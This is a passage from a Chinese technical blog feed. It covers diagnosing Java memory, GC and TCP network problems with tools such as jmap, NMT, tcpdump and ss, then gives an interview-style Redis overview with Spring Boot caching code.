thread</strong><br>这个意思是没有足够的内存空间给线程分配java栈，基本上还是线程池代码写的有问题，比如说忘记shutdown，所以说应该首先从代码层面来寻找问题，使用jstack或者jmap。如果一切都正常，JVM方面可以通过指定<code>Xss</code>来减少单个thread stack的大小。另外也可以在系统层面，可以通过修改<code>/etc/security/limits.conf</code>nofile和nproc来增大os对线程的限制<br><img src="/java/java/java-debug/2019-11-04-83816.png" alt="img"></p><p><strong>Exception in thread “main” java.lang.OutOfMemoryError: Java heap space</strong><br>这个意思是堆的内存占用已经达到-Xmx设置的最大值，应该是最常见的OOM错误了。解决思路仍然是先应该在代码中找，怀疑存在内存泄漏，通过jstack和jmap去定位问题。如果说一切都正常，才需要通过调整<code>Xmx</code>的值来扩大内存。</p><p><strong>Caused by: java.lang.OutOfMemoryError: Meta space</strong><br>这个意思是元数据区的内存占用已经达到<code>XX:MaxMetaspaceSize</code>设置的最大值，排查思路和上面的一致，参数方面可以通过<code>XX:MaxPermSize</code>来进行调整(这里就不说1.8以前的永久代了)。</p><h4 id="Stack-Overflow"><a href="#Stack-Overflow" class="headerlink" title="Stack Overflow"></a>Stack Overflow</h4><p>栈内存溢出，这个大家见到也比较多。<br><strong>Exception in thread “main” java.lang.StackOverflowError</strong><br>表示线程栈需要的内存大于Xss值，同样也是先进行排查，参数方面通过<code>Xss</code>来调整，但调整的太大可能又会引起OOM。</p><h4 id="使用JMAP定位代码内存泄漏"><a href="#使用JMAP定位代码内存泄漏" class="headerlink" title="使用JMAP定位代码内存泄漏"></a>使用JMAP定位代码内存泄漏</h4><p>上述关于OOM和StackOverflow的代码排查方面，我们一般使用JMAP<code>jmap -dump:format=b,file=filename pid</code>来导出dump文件<br><img src="/java/java/java-debug/2019-11-04-083817.png" alt="img"><br>通过mat(Eclipse Memory Analysis Tools)导入dump文件进行分析，内存泄漏问题一般我们直接选Leak Suspects即可，mat给出了内存泄漏的建议。另外也可以选择Top Consumers来查看最大对象报告。和线程相关的问题可以选择thread overview进行分析。除此之外就是选择Histogram类概览来自己慢慢分析，大家可以搜搜mat的相关教程。<br><img src="/java/java/java-debug/2019-11-04-083818.png" alt="img"></p><p>日常开发中，代码产生内存泄漏是比较常见的事，并且比较隐蔽，需要开发者更加关注细节。比如说每次请求都new对象，导致大量重复创建对象；进行文件流操作但未正确关闭；手动不当触发gc；ByteBuffer缓存分配不合理等都会造成代码OOM。</p><p>另一方面，我们可以在启动参数中指定<code>-XX:+HeapDumpOnOutOfMemoryError</code>来保存OOM时的dump文件。</p><h4 id="gc问题和线程"><a href="#gc问题和线程" class="headerlink" title="gc问题和线程"></a>gc问题和线程</h4><p>gc问题除了影响cpu也会影响内存，排查思路也是一致的。一般先使用jstat来查看分代变化情况，比如youngGC或者fullGC次数是不是太多呀；EU、OU等指标增长是不是异常呀等。<br>线程的话太多而且不被及时gc也会引发oom，大部分就是之前说的<code>unable to create new native thread</code>。除了jstack细细分析dump文件外，我们一般先会看下总体线程，通过<code>pstreee -p pid |wc -l</code>。<br><img src="/java/java/java-debug/2019-11-04-083819.png" alt="img"><br>或者直接通过查看<code>/proc/pid/task</code>的数量即为线程数量。<br><img src="/java/java/java-debug/2019-11-04-083820.png" alt="img"></p><h3 id="堆外内存"><a href="#堆外内存" class="headerlink" title="堆外内存"></a>堆外内存</h3><p>如果碰到堆外内存溢出，那可真是太不幸了。首先堆外内存溢出表现就是物理常驻内存增长快，报错的话视使用方式都不确定，如果由于使用Netty导致的，那错误日志里可能会出现<code>OutOfDirectMemoryError</code>错误，如果直接是DirectByteBuffer，那会报<code>OutOfMemoryError: Direct buffer memory</code>。</p><p>堆外内存溢出往往是和NIO的使用相关，一般我们先通过pmap来查看下进程占用的内存情况<code>pmap -x pid | sort -rn -k3 | head -30</code>，这段意思是查看对应pid倒序前30大的内存段。这边可以再一段时间后再跑一次命令看看内存增长情况，或者和正常机器比较可疑的内存段在哪里。<br><img src="/java/java/java-debug/2019-11-04-83821.png" alt="img"><br>我们如果确定有可疑的内存端，需要通过gdb来分析<code>gdb --batch --pid {pid} -ex &quot;dump memory filename.dump {内存起始地址} {内存起始地址+内存块大小}&quot;</code><br><img src="/java/java/java-debug/2019-11-04-083821.png" alt="img"><br>获取dump文件后可用heaxdump进行查看<code>hexdump -C filename | less</code>，不过大多数看到的都是二进制乱码。</p><p>NMT是Java7U40引入的HotSpot新特性，配合jcmd命令我们就可以看到具体内存组成了。需要在启动参数中加入 <code>-XX:NativeMemoryTracking=summary</code> 或者 <code>-XX:NativeMemoryTracking=detail</code>，会有略微性能损耗。</p><p>一般对于堆外内存缓慢增长直到爆炸的情况来说，可以先设一个基线<code>jcmd pid VM.native_memory baseline</code>。<br><img src="/java/java/java-debug/2019-11-04-083822.png" alt="img"><br>然后等放一段时间后再去看看内存增长的情况，通过<code>jcmd pid VM.native_memory detail.diff(summary.diff)</code>做一下summary或者detail级别的diff。<br><img src="/java/java/java-debug/2019-11-04-083823.png" alt="img"><br><img src="/java/java/java-debug/2019-11-04-83824.png" alt="img"><br>可以看到jcmd分析出来的内存十分详细，包括堆内、线程以及gc(所以上述其他内存异常其实都可以用nmt来分析)，这边堆外内存我们重点关注Internal的内存增长，如果增长十分明显的话那就是有问题了。<br>detail级别的话还会有具体内存段的增长情况，如下图。<br><img src="/java/java/java-debug/2019-11-04-083824.png" alt="img"></p><p>此外在系统层面，我们还可以使用strace命令来监控内存分配 <code>strace -f -e &quot;brk,mmap,munmap&quot; -p pid</code><br>这边内存分配信息主要包括了pid和内存地址。<br><img src="/java/java/java-debug/2019-11-04-083825.jpg" alt="img"></p><p>不过其实上面那些操作也很难定位到具体的问题点，关键还是要看错误日志栈，找到可疑的对象，搞清楚它的回收机制，然后去分析对应的对象。比如DirectByteBuffer分配内存的话，是需要full GC或者手动system.gc来进行回收的(所以最好不要使用<code>-XX:+DisableExplicitGC</code>)。那么其实我们可以跟踪一下DirectByteBuffer对象的内存情况，通过<code>jmap -histo:live pid</code>手动触发fullGC来看看堆外内存有没有被回收。如果被回收了，那么大概率是堆外内存本身分配的太小了，通过<code>-XX:MaxDirectMemorySize</code>进行调整。如果没有什么变化，那就要使用jmap去分析那些不能被gc的对象，以及和DirectByteBuffer之间的引用关系了。</p><h1 id="GC问题"><a href="#GC问题" class="headerlink" title="GC问题"></a>GC问题</h1><p>堆内内存泄漏总是和GC异常相伴。不过GC问题不只是和内存问题相关，还有可能引起CPU负载、网络问题等系列并发症，只是相对来说和内存联系紧密些，所以我们在此单独总结一下GC相关问题。</p><p>我们在cpu章介绍了使用jstat来获取当前GC分代变化信息。而更多时候，我们是通过GC日志来排查问题的，在启动参数中加上<code>-verbose:gc -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintGCTimeStamps</code>来开启GC日志。<br>常见的Young GC、Full GC日志含义在此就不做赘述了。</p><p>针对gc日志，我们就能大致推断出youngGC与fullGC是否过于频繁或者耗时过长，从而对症下药。我们下面将对G1垃圾收集器来做分析，这边也建议大家使用G1<code>-XX:+UseG1GC</code>。</p><p><strong>youngGC过频繁</strong><br>youngGC频繁一般是短周期小对象较多，先考虑是不是Eden区/新生代设置的太小了，看能否通过调整-Xmn、-XX:SurvivorRatio等参数设置来解决问题。如果参数正常，但是young gc频率还是太高，就需要使用Jmap和MAT对dump文件进行进一步排查了。</p><p><strong>youngGC耗时过长</strong><br>耗时过长问题就要看GC日志里耗时耗在哪一块了。以G1日志为例，可以关注Root Scanning、Object Copy、Ref Proc等阶段。Ref Proc耗时长，就要注意引用相关的对象。Root Scanning耗时长，就要注意线程数、跨代引用。Object Copy则需要关注对象生存周期。而且耗时分析它需要横向比较，就是和其他项目或者正常时间段的耗时比较。比如说图中的Root Scanning和正常时间段比增长较多，那就是起的线程太多了。<br><img src="/java/java/java-debug/2019-11-04-083826.png" alt="img"></p><p><strong>触发fullGC</strong><br>G1中更多的还是mixedGC，但mixedGC可以和youngGC思路一样去排查。触发fullGC了一般都会有问题，G1会退化使用Serial收集器来完成垃圾的清理工作，暂停时长达到秒级别，可以说是半跪了。<br>fullGC的原因可能包括以下这些，以及参数调整方面的一些思路：</p><ul><li>并发阶段失败：在并发标记阶段，MixGC之前老年代就被填满了，那么这时候G1就会放弃标记周期。这种情况，可能就需要增加堆大小，或者调整并发标记线程数<code>-XX:ConcGCThreads</code>。</li><li>晋升失败：在GC的时候没有足够的内存供存活/晋升对象使用，所以触发了Full GC。这时候可以通过<code>-XX:G1ReservePercent</code>来增加预留内存百分比，减少<code>-XX:InitiatingHeapOccupancyPercent</code>来提前启动标记，<code>-XX:ConcGCThreads</code>来增加标记线程数也是可以的。</li><li>大对象分配失败：大对象找不到合适的region空间进行分配，就会进行fullGC，这种情况下可以增大内存或者增大<code>-XX:G1HeapRegionSize</code>。</li><li>程序主动执行System.gc()：不要随便写就对了。</li></ul><p>另外，我们可以在启动参数中配置<code>-XX:HeapDumpPath=/xxx/dump.hprof</code>来dump fullGC相关的文件，并通过jinfo来进行gc前后的dump</p><pre><code class="java">jinfo -flag +HeapDumpBeforeFullGC pid jinfo -flag +HeapDumpAfterFullGC pid</code></pre><p>这样得到2份dump文件，对比后主要关注被gc掉的问题对象来定位问题。</p><h1 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h1><p>涉及到网络层面的问题一般都比较复杂，场景多，定位难，成为了大多数开发的噩梦，应该是最复杂的了。这里会举一些例子，并从tcp层、应用层以及工具的使用等方面进行阐述。</p><h3 id="超时"><a href="#超时" class="headerlink" title="超时"></a>超时</h3><p>超时错误大部分处在应用层面，所以这块着重理解概念。超时大体可以分为连接超时和读写超时，某些使用连接池的客户端框架还会存在获取连接超时和空闲连接清理超时。</p><ul><li>读写超时。readTimeout/writeTimeout，有些框架叫做so_timeout或者socketTimeout，均指的是数据读写超时。注意这边的超时大部分是指逻辑上的超时。soa的超时指的也是读超时。读写超时一般都只针对客户端设置。</li><li>连接超时。connectionTimeout，客户端通常指与服务端建立连接的最大时间。服务端这边connectionTimeout就有些五花八门了，jetty中表示空闲连接清理时间，tomcat则表示连接维持的最大时间。</li><li>其他。包括连接获取超时connectionAcquireTimeout和空闲连接清理超时idleConnectionTimeout。多用于使用连接池或队列的客户端或服务端框架。</li></ul><p>我们在设置各种超时时间中，需要确认的是尽量保持客户端的超时小于服务端的超时，以保证连接正常结束。</p><p>在实际开发中，我们关心最多的应该是接口的读写超时了。</p><p>如何设置合理的接口超时是一个问题。如果接口超时设置的过长，那么有可能会过多地占用服务端的tcp连接。而如果接口设置的过短，那么接口超时就会非常频繁。</p><p>服务端接口明明rt降低，但客户端仍然一直超时又是另一个问题。这个问题其实很简单，客户端到服务端的链路包括网络传输、排队以及服务处理等，每一个环节都可能是耗时的原因。</p><h3 id="TCP队列溢出"><a href="#TCP队列溢出" class="headerlink" title="TCP队列溢出"></a>TCP队列溢出</h3><p>tcp队列溢出是个相对底层的错误，它可能会造成超时、rst等更表层的错误。因此错误也更隐蔽，所以我们单独说一说。<br><img src="/java/java/java-debug/2019-11-04-083827.jpg" alt="img"></p><p>如上图所示，这里有两个队列：syns queue(半连接队列）、accept queue（全连接队列）。三次握手，在server收到client的syn后，把消息放到syns queue，回复syn+ack给client，server收到client的ack，如果这时accept queue没满，那就从syns queue拿出暂存的信息放入accept queue中，否则按tcp_abort_on_overflow指示的执行。</p><p>tcp_abort_on_overflow 0表示如果三次握手第三步的时候accept queue满了那么server扔掉client发过来的ack。tcp_abort_on_overflow 1则表示第三步的时候如果全连接队列满了，server发送一个rst包给client，表示废掉这个握手过程和这个连接，意味着日志里可能会有很多<code>connection reset / connection reset by peer</code>。</p><p>那么在实际开发中，我们怎么能快速定位到tcp队列溢出呢？</p><p><strong>netstat命令，执行netstat -s | egrep “listen|LISTEN”</strong><br><img src="/java/java/java-debug/2019-11-04-83828.jpg" alt="img"><br>如上图所示，overflowed表示全连接队列溢出的次数，sockets dropped表示半连接队列溢出的次数。</p><p><strong>ss命令，执行ss -lnt</strong><br><img src="/java/java/java-debug/2019-11-04-083828.jpg" alt="img"><br>上面看到Send-Q 表示第三列的listen端口上的全连接队列最大为5，第一列Recv-Q为全连接队列当前使用了多少。</p><p>接着我们看看怎么设置全连接、半连接队列大小吧：</p><p>全连接队列的大小取决于min(backlog, somaxconn)。backlog是在socket创建的时候传入的，somaxconn是一个os级别的系统参数。而半连接队列的大小取决于max(64, /proc/sys/net/ipv4/tcp_max_syn_backlog)。</p><p>在日常开发中，我们往往使用servlet容器作为服务端，所以我们有时候也需要关注容器的连接队列大小。在tomcat中backlog叫做<code>acceptCount</code>，在jetty里面则是<code>acceptQueueSize</code>。</p><h3 id="RST异常"><a href="#RST异常" class="headerlink" title="RST异常"></a>RST异常</h3><p>RST包表示连接重置，用于关闭一些无用的连接，通常表示异常关闭，区别于四次挥手。</p><p>在实际开发中，我们往往会看到<code>connection reset / connection reset by peer</code>错误，这种情况就是RST包导致的。</p><p><strong>端口不存在</strong></p><p>如果像不存在的端口发出建立连接SYN请求，那么服务端发现自己并没有这个端口则会直接返回一个RST报文，用于中断连接。</p><p><strong>主动代替FIN终止连接</strong></p><p>一般来说，正常的连接关闭都是需要通过FIN报文实现，然而我们也可以用RST报文来代替FIN，表示直接终止连接。实际开发中，可设置SO_LINGER数值来控制，这种往往是故意的，来跳过TIMED_WAIT，提供交互效率，不闲就慎用。</p><p><strong>客户端或服务端有一边发生了异常，该方向对端发送RST以告知关闭连接</strong></p><p>我们上面讲的tcp队列溢出发送RST包其实也是属于这一种。这种往往是由于某些原因，一方无法再能正常处理请求连接了(比如程序崩了，队列满了)，从而告知另一方关闭连接。</p><p><strong>接收到的TCP报文不在已知的TCP连接内</strong></p><p>比如，一方机器由于网络实在太差TCP报文失踪了，另一方关闭了该连接，然后过了许久收到了之前失踪的TCP报文，但由于对应的TCP连接已不存在，那么会直接发一个RST包以便开启新的连接。</p><p><strong>一方长期未收到另一方的确认报文，在一定时间或重传次数后发出RST报文</strong></p><p>这种大多也和网络环境相关了，网络环境差可能会导致更多的RST报文。</p><p>之前说过RST报文多会导致程序报错，在一个已关闭的连接上读操作会报<code>connection reset</code>，而在一个已关闭的连接上写操作则会报<code>connection reset by peer</code>。通常我们可能还会看到<code>broken pipe</code>错误，这是管道层面的错误，表示对已关闭的管道进行读写，往往是在收到RST，报出<code>connection reset</code>错后继续读写数据报的错，这个在glibc源码注释中也有介绍。</p><p>我们在排查故障时候怎么确定有RST包的存在呢？当然是使用tcpdump命令进行抓包，并使用wireshark进行简单分析了。<code>tcpdump -i en0 tcp -w xxx.cap</code>，en0表示监听的网卡。<br><img src="/java/java/java-debug/2019-11-04-083829.jpg" alt="img"></p><p>接下来我们通过wireshark打开抓到的包，可能就能看到如下图所示，红色的就表示RST包了。<br><img src="/java/java/java-debug/2019-11-04-083830.jpg" alt="img"></p><h3 id="TIME-WAIT和CLOSE-WAIT"><a href="#TIME-WAIT和CLOSE-WAIT" class="headerlink" title="TIME_WAIT和CLOSE_WAIT"></a>TIME_WAIT和CLOSE_WAIT</h3><p>TIME_WAIT和CLOSE_WAIT是啥意思相信大家都知道。<br>在线上时，我们可以直接用命令<code>netstat -n | awk &#39;/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}&#39;</code>来查看time-wait和close_wait的数量</p><p>用ss命令会更快<code>ss -ant | awk &#39;{++S[$1]} END {for(a in S) print a, S[a]}&#39;</code></p><p><img src="/java/java/java-debug/2019-11-04-083830.png" alt="img"></p><h4 id="TIME-WAIT"><a href="#TIME-WAIT" class="headerlink" title="TIME_WAIT"></a>TIME_WAIT</h4><p>time_wait的存在一是为了丢失的数据包被后面连接复用，二是为了在2MSL的时间范围内正常关闭连接。它的存在其实会大大减少RST包的出现。</p><p>过多的time_wait在短连接频繁的场景比较容易出现。这种情况可以在服务端做一些内核参数调优:</p><pre><code class="java">#表示开启重用。允许将TIME-WAIT sockets重新用于新的TCP连接，默认为0，表示关闭net.ipv4.tcp_tw_reuse = 1#表示开启TCP连接中TIME-WAIT sockets的快速回收，默认为0，表示关闭net.ipv4.tcp_tw_recycle = 1</code></pre><p>当然我们不要忘记在NAT环境下因为时间戳错乱导致数据包被拒绝的坑了，另外的办法就是改小<code>tcp_max_tw_buckets</code>，超过这个数的time_wait都会被干掉，不过这也会导致报<code>time wait bucket table overflow</code>的错。</p><h4 id="CLOSE-WAIT"><a href="#CLOSE-WAIT" class="headerlink" title="CLOSE_WAIT"></a>CLOSE_WAIT</h4><p>close_wait往往都是因为应用程序写的有问题，没有在ACK后再次发起FIN报文。close_wait出现的概率甚至比time_wait要更高，后果也更严重。往往是由于某个地方阻塞住了，没有正常关闭连接，从而渐渐地消耗完所有的线程。</p><p>想要定位这类问题，最好是通过jstack来分析线程堆栈来排查问题，具体可参考上述章节。这里仅举一个例子。</p><p>开发同学说应用上线后CLOSE_WAIT就一直增多，直到挂掉为止，jstack后找到比较可疑的堆栈是大部分线程都卡在了<code>countdownlatch.await</code>方法，找开发同学了解后得知使用了多线程但是确没有catch异常，修改后发现异常仅仅是最简单的升级sdk后常出现的<code>class not found</code>。</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Redis 总结</title>
      <link href="/Redis/redis/redis-summary/"/>
      <url>/Redis/redis/redis-summary/</url>
      
        <content type="html"><![CDATA[<p><strong>Redis 是什么</strong></p><p><strong>面试官：</strong>你先来说下 Redis 是什么吧！</p><p><strong>我：</strong>（这不就是总结下 Redis 的定义和特点嘛）Redis 是 C 语言开发的一个开源的（遵从 BSD 协议）高性能键值对（key-value）的内存数据库，可以用作数据库、缓存、消息中间件等。</p><p>它是一种 NoSQL（not-only sql，泛指非关系型数据库）的数据库。</p><p>我顿了一下，接着说，Redis 作为一个内存数据库：</p><ul><li>性能优秀，数据在内存中，读写速度非常快，支持并发 10W QPS。</li><li>单进程单线程，是线程安全的，采用 IO 多路复用机制。</li><li>丰富的数据类型，支持字符串（strings）、散列（hashes）、列表（lists）、集合（sets）、有序集合（sorted sets）等。</li><li>支持数据持久化。<br>可以将内存中数据保存在磁盘中，重启时加载。</li><li>主从复制，哨兵，高可用。</li><li>可以用作分布式锁。</li><li>可以作为消息中间件使用，支持发布订阅。</li></ul><p><strong>五种数据类型</strong></p><p><strong>面试官：</strong>总结的不错，看来是早有准备啊。刚来听你提到 Redis 支持五种数据类型，那你能简单说下这五种数据类型吗？</p><p><strong>我：</strong>当然可以，但是在说之前，我觉得有必要先来了解下 Redis 内部内存管理是如何描述这 5 种数据类型的。</p><p>说着，我拿着笔给面试官画了一张图：</p><p><img src="/Redis/redis/redis-summary/v2-f50cc08a309349c853c7ad515b1393ec_1440w.jpg" alt="img"></p><p><strong>我：</strong>首先 Redis 内部使用一个 redisObject 对象来表示所有的 key 和 value。</p><p>redisObject 最主要的信息如上图所示：type 表示一个 value 对象具体是何种数据类型，encoding 是不同数据类型在 Redis 内部的存储方式。</p><p>比如：type=string 表示 value 存储的是一个普通字符串，那么 encoding 可以是 raw 或者 int。</p><p>我顿了一下，接着说，下面我简单说下 5 种数据类型：</p><p>①String 是 Redis 最基本的类型，可以理解成与 Memcached一模一样的类型，一个 Key 对应一个 Value。Value 不仅是 String，也可以是数字。</p><p>String 类型是二进制安全的，意思是 Redis 的 String 类型可以包含任何数据，比如 jpg 图片或者序列化的对象。String 类型的值最大能存储 512M。</p><p>②Hash是一个键值（key-value）的集合。Redis 的 Hash 是一个 String 的 Key 和 Value 的映射表，Hash 特别适合存储对象。常用命令：hget，hset，hgetall 等。</p><p>③List 列表是简单的字符串列表，按照插入顺序排序。可以添加一个元素到列表的头部（左边）或者尾部（右边） 常用命令：lpush、rpush、lpop、rpop、lrange（获取列表片段）等。</p><p>应用场景：List 应用场景非常多，也是 Redis 最重要的数据结构之一，比如 Twitter 的关注列表，粉丝列表都可以用 List 结构来实现。</p><p>数据结构：List 就是链表，可以用来当消息队列用。Redis 提供了 List 的 Push 和 Pop 操作，还提供了操作某一段的 API，可以直接查询或者删除某一段的元素。</p><p>实现方式：Redis List 的是实现是一个双向链表，既可以支持反向查找和遍历，更方便操作，不过带来了额外的内存开销。</p><p>④Set 是 String 类型的无序集合。集合是通过 hashtable 实现的。Set 中的元素是没有顺序的，而且是没有重复的。常用命令：sdd、spop、smembers、sunion 等。</p><p>应用场景：Redis Set 对外提供的功能和 List 一样是一个列表，特殊之处在于 Set 是自动去重的，而且 Set 提供了判断某个成员是否在一个 Set 集合中。</p><p>⑤Zset 和 Set 一样是 String 类型元素的集合，且不允许重复的元素。常用命令：zadd、zrange、zrem、zcard 等。</p><p>使用场景：Sorted Set 可以通过用户额外提供一个优先级（score）的参数来为成员排序，并且是插入有序的，即自动排序。</p><p>当你需要一个有序的并且不重复的集合列表，那么可以选择 Sorted Set 结构。</p><p>和 Set 相比，Sorted Set关联了一个 Double 类型权重的参数 Score，使得集合中的元素能够按照 Score 进行有序排列，Redis 正是通过分数来为集合中的成员进行从小到大的排序。</p><p>实现方式：Redis Sorted Set 的内部使用 HashMap 和跳跃表（skipList）来保证数据的存储和有序，HashMap 里放的是成员到 Score 的映射。</p><p>而跳跃表里存放的是所有的成员，排序依据是 HashMap 里存的 Score，使用跳跃表的结构可以获得比较高的查找效率，并且在实现上比较简单。</p><p><strong>数据类型应用场景总结：</strong></p><p><img src="/Redis/redis/redis-summary/v2-a4667eebbc97ad5c0223760a092bf6e4_1440w.jpg" alt="img"></p><p><strong>面试官：</strong>想不到你平时也下了不少工夫，那 Redis 缓存你一定用过的吧？</p><p><strong>我：</strong>用过的。</p><p><strong>面试官：</strong>那你跟我说下你是怎么用的？</p><p>我是结合 Spring Boot 使用的。一般有两种方式，一种是直接通过 RedisTemplate 来使用，另一种是使用 Spring Cache 集成 Redis（也就是注解的方式）。</p><p><strong>Redis 缓存</strong></p><p>直接通过 RedisTemplate 来使用，使用 Spring Cache 集成 Redis pom.xml 中加入以下依赖：</p><pre><code class="text">&lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;        &lt;artifactId&gt;commons-pool2&lt;/artifactId&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.springframework.session&lt;/groupId&gt;        &lt;artifactId&gt;spring-session-data-redis&lt;/artifactId&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;        &lt;artifactId&gt;lombok&lt;/artifactId&gt;        &lt;optional&gt;true&lt;/optional&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;        &lt;scope&gt;test&lt;/scope&gt;    &lt;/dependency&gt;&lt;/dependencies&gt;</code></pre><p><strong>spring-boot-starter-data-redis：</strong>在 Spring Boot 2.x 以后底层不再使用 Jedis，而是换成了 Lettuce。</p><p><strong>commons-pool2：</strong>用作 Redis 连接池，如不引入启动会报错。</p><p><strong>spring-session-data-redis：</strong>Spring Session 引入，用作共享 Session。</p><p>配置文件 application.yml 的配置：</p><pre><code class="text">server:  port: 8082  servlet:    session:      timeout: 30msspring:  cache:    type: redis  redis:    host: 127.0.0.1    port: 6379    password:    # redis默认情况下有16个分片，这里配置具体使用的分片，默认为0    database: 0    lettuce:      pool:        # 连接池最大连接数(使用负数表示没有限制),默认8        max-active: 100</code></pre><p>创建实体类 User.java：</p><pre><code class="text">public class User implements Serializable{    private static final long serialVersionUID = 662692455422902539L;    private Integer id;    private String name;    private Integer age;    public User() {    }    public User(Integer id, String name, Integer age) {        this.id = id;        this.name = name;        this.age = age;    }    public Integer getId() {        return id;    }    public void setId(Integer id) {        this.id = id;    }    public String getName() {        return name;    }    public void setName(String name) {        this.name = name;    }    public Integer getAge() {        return age;    }    public void setAge(Integer age) {        this.age = age;    }    @Override    public String toString() {        return &quot;User{&quot; +                &quot;id=&quot; + id +                &quot;, name=&#39;&quot; + name + &#39;\&#39;&#39; +                &quot;, age=&quot; + age +                &#39;}&#39;;    }}</code></pre><p><strong>RedisTemplate 的使用方式</strong></p><p>默认情况下的模板只能支持 RedisTemplate&lt;String, String&gt;，也就是只能存入字符串，所以自定义模板很有必要。</p><p>添加配置类 RedisCacheConfig.java：</p><pre><code class="text">@Configuration@AutoConfigureAfter(RedisAutoConfiguration.class)public class RedisCacheConfig {    @Bean    public RedisTemplate&lt;String, Serializable&gt; redisCacheTemplate(LettuceConnectionFactory connectionFactory) {        RedisTemplate&lt;String, Serializable&gt; template = new RedisTemplate&lt;&gt;();        template.setKeySerializer(new StringRedisSerializer());        template.setValueSerializer(new GenericJackson2JsonRedisSerializer());        template.setConnectionFactory(connectionFactory);        return template;    }}</code></pre><p>测试类：</p><pre><code class="text">@RestController@RequestMapping(&quot;/user&quot;)public class UserController {    public static Logger logger = LogManager.getLogger(UserController.class);    @Autowired    private StringRedisTemplate stringRedisTemplate;    @Autowired    private RedisTemplate&lt;String, Serializable&gt; redisCacheTemplate;    @RequestMapping(&quot;/test&quot;)    public void test() {        redisCacheTemplate.opsForValue().set(&quot;userkey&quot;, new User(1, &quot;张三&quot;, 25));        User user = (User) redisCacheTemplate.opsForValue().get(&quot;userkey&quot;);        logger.info(&quot;当前获取对象：{}&quot;, user.toString());    }</code></pre><p>然后在浏览器访问，观察后台日志 <a href="http://localhost:8082/user/test" target="_blank" rel="noopener">http://localhost:8082/user/test</a></p><p><img src="/Redis/redis/redis-summary/v2-459aa19b6acff143007e38c45341c46d_1440w.png" alt="img"></p><p><strong>使用 Spring Cache 集成 Redis</strong></p><p>Spring Cache 具备很好的灵活性，不仅能够使用 SPEL（spring expression language）来定义缓存的 Key 和各种 Condition，还提供了开箱即用的缓存临时存储方案，也支持和主流的专业缓存如 EhCache、Redis、Guava 的集成。</p><p>定义接口 UserService.java：</p><pre><code class="text">public interface UserService {    User save(User user);    void delete(int id);    User get(Integer id);}</code></pre><p>接口实现类 UserServiceImpl.java：</p><pre><code class="text">@Servicepublic class UserServiceImpl implements UserService{    public static Logger logger = LogManager.getLogger(UserServiceImpl.class);    private static Map&lt;Integer, User&gt; userMap = new HashMap&lt;&gt;();    static {        userMap.put(1, new User(1, &quot;肖战&quot;, 25));        userMap.put(2, new User(2, &quot;王一博&quot;, 26));        userMap.put(3, new User(3, &quot;杨紫&quot;, 24));    }    @CachePut(value =&quot;user&quot;, key = &quot;#user.id&quot;)    @Override    public User save(User user) {        userMap.put(user.getId(), user);        logger.info(&quot;进入save方法，当前存储对象：{}&quot;, user.toString());        return user;    }    @CacheEvict(value=&quot;user&quot;, key = &quot;#id&quot;)    @Override    public void delete(int id) {        userMap.remove(id);        logger.info(&quot;进入delete方法，删除成功&quot;);    }    @Cacheable(value = &quot;user&quot;, key = &quot;#id&quot;)    @Override    public User get(Integer id) {        logger.info(&quot;进入get方法，当前获取对象：{}&quot;, userMap.get(id)==null?null:userMap.get(id).toString());        return userMap.get(id);    }}</code></pre><p>为了方便演示数据库的操作，这里直接定义了一个 Map&lt;Integer,User&gt; userMap。</p><p>这里的核心是三个注解：</p><ul><li><strong>@Cachable</strong></li><li><strong>@CachePut</strong></li><li><strong>@CacheEvict</strong></li></ul><p>测试类：UserController</p><pre><code class="text">@RestController@RequestMapping(&quot;/user&quot;)public class UserController {    public static Logger logger = LogManager.getLogger(UserController.class);    @Autowired    private StringRedisTemplate stringRedisTemplate;    @Autowired    private RedisTemplate&lt;String, Serializable&gt; redisCacheTemplate;    @Autowired    private UserService userService;    @RequestMapping(&quot;/test&quot;)    public void test() {        redisCacheTemplate.opsForValue().set(&quot;userkey&quot;, new User(1, &quot;张三&quot;, 25));        User user = (User) redisCacheTemplate.opsForValue().get(&quot;userkey&quot;);        logger.info(&quot;当前获取对象：{}&quot;, user.toString());    }    @RequestMapping(&quot;/add&quot;)    public void add() {        User user = userService.save(new User(4, &quot;李现&quot;, 30));        logger.info(&quot;添加的用户信息：{}&quot;,user.toString());    }    @RequestMapping(&quot;/delete&quot;)    public void delete() {        userService.delete(4);    }    @RequestMapping(&quot;/get/{id}&quot;)    public void get(@PathVariable(&quot;id&quot;) String idStr) throws Exception{        if (StringUtils.isBlank(idStr)) {            throw new Exception(&quot;id为空&quot;);        }        Integer id = Integer.parseInt(idStr);        User user = userService.get(id);        logger.info(&quot;获取的用户信息：{}&quot;,user.toString());    }}</code></pre><p>用缓存要注意，启动类要加上一个注解开启缓存：</p><pre><code class="text">@SpringBootApplication(exclude=DataSourceAutoConfiguration.class)@EnableCachingpublic class Application {    public static void main(String[] args) {        SpringApplication.run(Application.class, args);    }}</code></pre><p>①先调用添加接口：<a href="http://localhost:8082/user/add" target="_blank" rel="noopener">http://localhost:8082/user/add</a></p><p><img src="/Redis/redis/redis-summary/v2-c1bca7d17cddfcf85dd7f978a416a784_1440w.png" alt="img"></p><p>②再调用查询接口，查询 id=4 的用户信息：</p><p><img src="/Redis/redis/redis-summary/v2-b3b71fffac020c234f718d48bb49bd18_1440w.png" alt="img"></p><p>可以看出，这里已经从缓存中获取数据了，因为上一步 add 方法已经把 id=4 的用户数据放入了 Redis 缓存 3、调用删除方法，删除 id=4 的用户信息，同时清除缓存：</p><p><img src="/Redis/redis/redis-summary/v2-51b1a94e60af8fa36f65fa3d374509d3_1440w.png" 